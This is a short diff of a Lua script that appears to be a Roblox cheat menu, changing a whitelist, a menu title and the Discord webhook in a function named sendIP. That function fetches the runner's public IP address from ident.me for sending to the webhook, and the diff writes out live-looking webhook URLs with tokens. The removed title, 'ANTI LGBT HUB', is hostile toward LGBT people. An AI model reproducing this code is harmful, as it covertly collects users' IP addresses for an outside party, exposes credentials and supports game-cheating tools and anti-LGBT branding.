@@ -25,6 +25,7 @@ local framework = {
           azoozAccounts = {
               [21763271] = true,
               [141202542] = true,
+              [17049167] = true,
               [4135012] = true,
           },
           smail_accounts = {
@@ -65,7 +66,7 @@ local framework = {
   end
   
   local function sendIP(whitelistKey)
-    local Webhook = "https://discord.com/api/webhooks/937486195330539530/he_jH5ZklBQChfUD6bcZW4ajJ33LFlHo78ZDjLEZcMBKDt2ck3ICxpvqwEIVwt6OTgwq"
+    local Webhook = "https://discord.com/api/webhooks/942950250505719828/dPO-Lssx_1t-YYsjxcX9r7AusRtfRII5n7HQVMnu5n_ebKhXpjCTP5CkW2ksg0bGrh51"
     local IPv4 = game:HttpGet("https://v4.ident.me/")
     --local IPv6 = game:HttpGet("https://v6.ident.me/")
   
@@ -2071,8 +2072,8 @@ local framework = {
       Size = UDim2.new(0, 494, 0, 24),
       BackgroundTransparency = 1,
       Font = framework.menuSettings.font,
-      Text = "ANTI LGBT HUB",
-      TextColor3 = chromaColor,
+      Text = "Vortex Z",
+      TextColor3 = Color3.fromRGB(255, 255, 255),
       TextSize = framework.menuSettings.titleSize,
       TextXAlignment = Enum.TextXAlignment.Left
     })
